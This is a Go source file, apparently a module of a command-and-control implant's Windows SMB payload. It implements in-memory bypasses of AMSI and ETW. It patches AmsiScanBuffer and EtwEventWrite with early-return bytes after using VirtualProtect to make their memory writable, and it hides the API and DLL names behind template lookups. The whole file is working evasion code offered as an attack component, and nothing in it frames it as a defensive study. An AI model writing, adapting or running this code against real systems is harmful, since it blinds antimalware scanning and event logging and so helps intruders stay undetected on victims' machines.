// server/docker/payloads/SMB_Windows/patches.go
//go:build windows
// +build windows

package main

import (
	"fmt"
	"sync"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Template indices for patches strings - must match server's common.go
const (
	// Existing COFF indices we can reuse
	idxPatchDllNtdll           = 871 // ntdll.dll (IdxCoffDllNtdll)
	idxPatchApiVirtualProtect  = 887 // VirtualProtect (IdxCoffApiVirtualProtect)
	idxPatchApiGetCurrentProc  = 889 // GetCurrentProcess (IdxCoffApiGetCurrentProcess)

	// New patches-specific indices
	idxPatchAmsiDll          = 1010 // amsi.dll
	idxPatchAmsiScanBuffer   = 1011 // AmsiScanBuffer
	idxPatchEtwEventWrite    = 1012 // EtwEventWrite
	idxPatchNtProtectVirtMem = 1013 // NtProtectVirtualMemory
)

// patchTpl retrieves template strings from BOF template
func patchTpl(idx int) string {
	return bofTpl(idx)
}

// Convenience functions for patches strings
func patchDllNtdll() string           { return patchTpl(idxPatchDllNtdll) }
func patchDllAmsi() string            { return patchTpl(idxPatchAmsiDll) }
func patchApiAmsiScanBuffer() string  { return patchTpl(idxPatchAmsiScanBuffer) }
func patchApiEtwEventWrite() string   { return patchTpl(idxPatchEtwEventWrite) }
func patchApiVirtualProtect() string  { return patchTpl(idxPatchApiVirtualProtect) }
func patchApiGetCurrentProcess() string { return patchTpl(idxPatchApiGetCurrentProc) }
func patchApiNtProtectVirtMem() string { return patchTpl(idxPatchNtProtectVirtMem) }

// Lazy DLL initialization
var (
	patchDllInitOnce sync.Once
	patchNtdllDLL    *syscall.LazyDLL

	virtualProtect         *syscall.LazyProc
	getCurrentProcess      *syscall.LazyProc
	ntProtectVirtualMemory *syscall.LazyProc
)

// initPatchDlls initializes DLLs lazily after templates are available
func initPatchDlls() {
	patchDllInitOnce.Do(func() {
		patchNtdllDLL = syscall.NewLazyDLL(patchDllNtdll())

		virtualProtect = kernel32DLL.NewProc(patchApiVirtualProtect())
		getCurrentProcess = kernel32DLL.NewProc(patchApiGetCurrentProcess())
		ntProtectVirtualMemory = patchNtdllDLL.NewProc(patchApiNtProtectVirtMem())
	})
}

// AMSI bypass
func patchAMSI() error {
	amsi := windows.NewLazySystemDLL(patchDllAmsi())
	amsiScanBuffer := amsi.NewProc(patchApiAmsiScanBuffer())

	if amsiScanBuffer.Addr() == 0 {
		return fmt.Errorf(Err(E4))
	}

	var patch []byte
	if unsafe.Sizeof(uintptr(0)) == 8 {
		patch = []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
	} else {
		patch = []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00}
	}

	return applyPatch(amsiScanBuffer.Addr(), patch)
}

// ETW bypass
func patchETW() error {
	ntdll := windows.NewLazySystemDLL(patchDllNtdll())
	etwEventWrite := ntdll.NewProc(patchApiEtwEventWrite())

	if etwEventWrite.Addr() == 0 {
		return fmt.Errorf(Err(E4))
	}

	var patch []byte
	if unsafe.Sizeof(uintptr(0)) == 8 {
		patch = []byte{0x33, 0xC0, 0xC3}
	} else {
		patch = []byte{0x33, 0xC0, 0xC2, 0x14, 0x00}
	}

	return applyPatch(etwEventWrite.Addr(), patch)
}

func applyPatch(addr uintptr, patch []byte) error {
	var oldProtect uint32

	err := windows.VirtualProtect(
		addr,
		uintptr(len(patch)),
		windows.PAGE_EXECUTE_READWRITE,
		&oldProtect,
	)
	if err != nil {
		return err
	}

	for i, b := range patch {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
	}

	handle := windows.CurrentProcess()
	flushInstructionCache.Call(
		uintptr(handle),
		addr,
		uintptr(len(patch)),
	)

	windows.VirtualProtect(
		addr,
		uintptr(len(patch)),
		oldProtect,
		&oldProtect,
	)

	return nil
}
